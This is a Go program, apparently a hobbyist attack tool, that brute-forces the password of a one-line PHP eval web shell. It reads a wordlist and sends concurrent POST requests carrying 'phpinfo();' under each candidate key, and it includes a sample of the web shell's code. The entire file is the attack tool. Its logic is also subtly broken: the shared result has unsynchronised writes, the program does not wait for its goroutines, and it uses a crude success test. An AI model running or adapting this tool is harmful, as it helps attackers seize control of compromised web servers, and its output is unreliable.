package main

import (
	"bufio"
	"fmt"
	"io/ioutil"
	"log"
	"net/http"
	"net/url"
	"os"
)

//Making a single post request to the IP address with provided password as a webshell password
func postRequest(password string, address string) string {
	data := url.Values{
		password: {"phpinfo();"},
	}

	resp, err := http.PostForm(address, data)
	if err != nil {
		log.Fatal(err)
	}

	bodyBytes, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		log.Fatal(err)
	}
	bodyString := string(bodyBytes)
	fmt.Println(password)

	if bodyString != "<!--?php eval($_POST[xxxooo]);?-->" {
		return password
	}
	return ""
}

//This is an easy fuzzing tool used to retrieve the password for one line PHP web shell
func main() {

	finalAns := "None"
	address := os.Args[1]
	passwordList := os.Args[2]

	maxGoroutines := 20
	guard := make(chan struct{}, maxGoroutines)

	passwordFile, err := os.Open(passwordList)
	if err != nil {
		log.Fatal(err)
	}
	defer passwordFile.Close()

	scanner := bufio.NewScanner(passwordFile)
	for scanner.Scan() {
		currPass := scanner.Text()
		guard <- struct{}{}

		go func(currPass string) {
			currAns := postRequest(currPass, address)
			if currAns != "" {
				finalAns = currAns
			}
			<-guard
		}(currPass)
	}

	fmt.Println("Find the password: " + finalAns)
}
